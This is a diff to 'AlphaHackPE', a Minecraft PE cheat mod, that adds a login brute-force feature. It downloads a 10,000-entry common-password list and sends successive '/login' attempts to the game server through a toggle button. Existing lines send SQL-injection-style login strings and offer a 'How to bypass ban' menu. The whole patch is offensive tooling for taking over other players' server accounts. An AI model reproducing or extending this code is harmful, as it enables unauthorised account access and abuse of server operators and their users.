@@ -83,6 +83,9 @@ var haxMode = false;
 var newtime = '';
 var newnamet = '';
 var checkslapper = false;
+let passurl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt";
+var allDePasswords;
+var numhack3 = 0;
 /*B͎̞̠̠̘̙͈̳͙̳̅͛̽̉͑o̥̤̥̗̥͈̯̯̳̹ͥ̊ͮͭo̠͈̼̱͖̖͂̐̄̉͂͂ͭl͕̰͙̰ͮ̂̐͐͒͂̽̑e̘͈̤̫̟̫̦̞͙̻̲̤͓͓͉̘͇̔̆ͨͧ͊̏̍ͩͥa͕͖͚̟͖̟̫͉̱̗̪͍̾̈́̇̎ͭͭ̈̚ͅͅǹ̫͔̘̤̻̼̫̝͔̙̻͓͕̰͇̘ͮ̂̏̎ͣ̉͛̓ͫ̚ͅs̼͍̤͇̞̝̱͎̺̟͇̮̘̣̪̲̤ͯ̆̂͊͆̾́͐ͨͣ͂ͣ*/
 var abcabc123 = false;
 var liquidwalk = false;
@@ -250,6 +253,7 @@ var fp9x1_ = false;
 var fp9x2_ = false;
 var spinaura = false;
 var autolog = false;
+var newpasshack = false;
 //ParticleType.angryVillager;
 var particle1 = false;
 //ParticleType.bubble;
@@ -443,6 +447,9 @@ var AlphaHackPE = {
 	},
 	dailyEvent: function () {
 	    return checkHoliday();
+	},
+	downloadPasses: function () {
+		return getPasses();
 	}
 }
 AlphaHackPE.dailyEvent();
@@ -906,6 +913,15 @@ function getUpdate() {
 	if (version != newupdate) startUp(newupdate);
 }
 AlphaHackPE.checkUpdate();
+
+//Copyright Godsoft029 2016-2017
+/*servicehack & dragop passhack ported to alphahack by arceusmatt*/
+function getPasses() {
+    var jsoncontent3 = ModPE.getFromUrl(passurl);
+    var storpass = jsoncontent3;
+    allDePasswords = storpass.split("\n");
+}
+AlphaHack.downloadPasses();
 
 function newLevel() {
 	clientMessage("§2≡≡=======»§a>§9 §a§kAlpha§r §a<§2«======≡≡§f§r");
@@ -3191,6 +3207,25 @@ function misc_menu() {
 					}
 				});
 				miscLayout.addView(pass2);
+				var d32icb = new styleButton();
+				d32icb.setText("Brute force (random)");
+				d32icb.setTextColor(android.graphics.Color.RED);
+				if (newpasshack == true) d32icb.setTextColor(android.graphics.Color.GREEN);
+				d32icb.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (v) {
+						newpasshack ? newpasshack = false : newpasshack = true;
+						d32icb.setText("Brute force (random)");
+						if (newpasshack == true) {
+							d32icb.setTextColor(android.graphics.Color.GREEN);
+							newpasshack = true;
+						}
+						if (newpasshack == false) {
+							d32icb.setTextColor(android.graphics.Color.RED);
+							newpasshack = false;
+						}
+					}
+				});
+				miscLayout.addView(d32icb);
 				var ht1 = new styleButton();
 				ht1.setText("How to bypass ban");
 				ht1.setOnClickListener(new android.view.View.OnClickListener() {
@@ -18630,6 +18665,12 @@ function rptask() {
 							numhack2++
 							Server.sendChat("./login " + numhack2 + "' or '" + numhack2 + "' = '" + numhack2);
 							clientMessage("./login " + numhack2 + "' or '" + numhack2 + "' = '" + numhack2);
+						}
+						if (passhack){
+							numhack3++
+							let passwords = allDePasswords[numhack3];
+							Server.sendChat("./login "+passwords);
+							clientMessage(client + "/login "+passwords);
 						}
 						if (autodestroy) {
 							Level.destroyBlock(Player.getPointedBlockX(), Player.getPointedBlockY(), Player.getPointedBlockZ(), vidd);
